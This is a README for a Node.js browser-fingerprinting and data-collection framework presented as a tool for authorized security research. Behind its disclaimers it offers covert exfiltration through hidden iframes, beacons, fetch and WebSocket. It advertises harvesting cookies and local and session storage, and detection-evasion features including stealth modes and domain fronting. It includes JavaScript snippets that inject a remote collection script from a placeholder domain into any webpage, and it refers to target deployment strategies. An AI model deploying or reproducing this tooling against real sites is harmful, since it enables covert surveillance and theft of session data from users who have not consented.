# Universal Web Application Security Research Framework

A comprehensive browser fingerprinting and data collection framework designed for authorized security research, penetration testing, and security awareness demonstrations.

## ⚠️ IMPORTANT LEGAL NOTICE

**THIS TOOL IS FOR AUTHORIZED SECURITY RESEARCH ONLY**

This framework must only be used for:
- ✅ Authorized penetration testing with explicit written permission
- ✅ Bug bounty programs with proper scope authorization
- ✅ Educational/research purposes on your own domains
- ✅ Security awareness demonstrations with proper consent
- ✅ Red team exercises with organizational approval

**NEVER use this tool for:**
- ❌ Unauthorized data collection
- ❌ Malicious activities or cybercrimes
- ❌ Privacy violations
- ❌ Terms of service violations
- ❌ Any illegal activities

Users are solely responsible for ensuring compliance with all applicable laws and obtaining proper authorization before use.

## 🔍 Overview

This framework provides comprehensive browser fingerprinting and server-side data collection capabilities for security professionals. It consists of:

- **Universal Fingerprinting Engine**: Collects detailed browser, system, and environmental data
- **Professional Web Interface**: Clean, responsive UI for fingerprinting demonstrations
- **Multi-Method Data Exfiltration**: Redundant data collection with multiple transport methods
- **Configurable Server Backend**: Node.js server with HTTPS support and comprehensive logging
- **Target-Agnostic Design**: Works across any web application or website

## 🏗️ Architecture

```
├── index.html              # Main fingerprinting demonstration interface
├── server.js              # Node.js HTTPS server with API endpoints
├── js/
│   ├── fingerprint.js     # Main fingerprinting collection engine
│   └── test.js           # Advanced data exfiltration for security testing
├── implementation-guide.md # Target deployment and implementation guide
└── access.log            # Request and data collection logs
```

## 🚀 Features

### Browser Fingerprinting
- **Browser Information**: User agent, language preferences, plugins, etc.
- **System Information**: Screen resolution, hardware specs, device capabilities
- **Canvas & WebGL Fingerprinting**: Hardware-based identification
- **Audio Context Analysis**: Unique audio fingerprint generation
- **Font Detection**: Available system fonts enumeration
- **Media Device Enumeration**: Camera and microphone detection
- **Advanced Timing Attacks**: Performance-based fingerprinting

### Server-Side Collection
- **IP Address Analysis**: Real client IP detection through proxies/CDNs
- **HTTP Header Analysis**: Comprehensive request header examination
- **SSL/TLS Information**: Certificate and encryption details
- **Geographic Data**: Location-based information where available
- **Request Timing**: Performance and latency analysis

### Data Exfiltration Methods
- **Image Beacon**: 1x1 pixel tracking method
- **Fetch API**: Modern POST request method
- **XMLHttpRequest**: Traditional AJAX method
- **Hidden Iframe**: Stealth data transmission
- **WebSocket**: Real-time data streaming (when configured)

## 📋 Prerequisites

- Node.js 14.x or higher
- SSL certificates for HTTPS (optional for development)
- Modern web browser for testing

## 🛠️ Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd catch
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   # Edit .env with your configuration
   ```

4. **Configure SSL certificates (Production)**
   ```bash
   # Place your SSL certificates in the configured paths
   # Or update the certificate paths in your .env file
   ```

## ⚙️ Configuration

Create a `.env` file based on `.env.example`:

```env
# Server Configuration
PORT=443
HTTPS_PORT=443
HTTP_PORT=80
NODE_ENV=development

# SSL Configuration (Production)
SSL_KEY_PATH=/path/to/private-key.pem
SSL_CERT_PATH=/path/to/certificate.pem

# Application Configuration
BASE_URL=https://your-domain.com
API_ENDPOINT=/api/fingerprint
EXFIL_ENDPOINT=/exfil

# Logging Configuration
LOG_FILE=access.log
LOG_LEVEL=info
```

## 🚀 Usage

### Development Mode (HTTP)
```bash
npm run dev
```
Runs on HTTP port 8080 by default, eliminating SSL requirements for local testing.

### Production Mode (HTTPS)
```bash
npm start
```
Runs with full HTTPS and HTTP-to-HTTPS redirect functionality.

### Custom Configuration
```bash
NODE_ENV=production PORT=8443 npm start
```

## 🌐 API Endpoints

### Main Interface
- `GET /` - Fingerprinting demonstration interface
- `GET /js/fingerprint.js` - Main fingerprinting script
- `GET /js/test.js` - Advanced data collection script

### Data Collection APIs
- `GET /api/fingerprint` - JSON API for server-side data
- `GET /exfil?data=<encoded>` - Image beacon data collection
- `POST /api/fingerprint` - POST-based data submission
- `GET /exfil-frame?data=<encoded>` - Iframe-based data collection

### Universal Endpoints
The server accepts ALL HTTP methods for maximum compatibility:
`GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, CONNECT, TRACE`

## 🎯 Implementation

### Basic Implementation
```javascript
// Load the fingerprinting script on any webpage
const script = document.createElement('script');
script.src = 'https://your-domain.com/js/fingerprint.js';
document.head.appendChild(script);
```

### Advanced Implementation
```javascript
// Load the comprehensive data collection script
const script = document.createElement('script');
script.src = 'https://your-domain.com/js/test.js';
document.head.appendChild(script);
```

See `implementation-guide.md` for detailed deployment strategies and target-specific implementation methods.

## 📊 Data Collection

### Client-Side Data
- Browser and engine information
- Screen and display properties
- Hardware capabilities
- Installed fonts and plugins
- Canvas and WebGL fingerprints
- Audio context signatures
- Device sensors and media capabilities
- Local and session storage contents
- Cookie analysis

### Server-Side Data
- Real client IP address
- Geographic location data
- HTTP request headers
- SSL/TLS connection details
- Request timing information
- Referrer and origin analysis

## 🛡️ Security Considerations

### Detection Evasion
- Multiple data transmission methods
- Randomized execution timing
- Stealth operation modes
- Base64 encoding for data transmission
- Domain fronting capabilities

### Privacy Protection
- No persistent storage of personal data
- Configurable data retention periods
- Anonymization options
- Compliance with privacy regulations

## 🧪 Testing

### Local Testing
1. Start the development server: `npm run dev`
2. Visit `http://localhost:8080`
3. Monitor console logs for data collection
4. Check `access.log` for server-side logs

### Production Testing
1. Deploy with proper SSL certificates
2. Configure DNS and firewall settings
3. Test HTTPS functionality
4. Verify HTTP-to-HTTPS redirects

## 📝 Logging

All requests are logged to `access.log` with comprehensive details:
- Timestamp and client IP
- HTTP method and URL
- User agent and headers
- Request body content (for POST/PUT)
- Geographic and connection data

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Ensure all security guidelines are followed
4. Add appropriate tests 
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔒 Security Policy

See [SECURITY.md](SECURITY.md) for our security policy and vulnerability reporting guidelines.

## ⚖️ Ethical Use

This tool is designed for legitimate security research and testing. Users must:
- Obtain explicit written permission before testing any system
- Comply with all applicable laws and regulations
- Respect privacy and data protection requirements
- Follow responsible disclosure practices
- Use the tool only for defensive security purposes

## 📞 Support

For questions about authorized use cases or technical support, please open an issue on this repository.

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
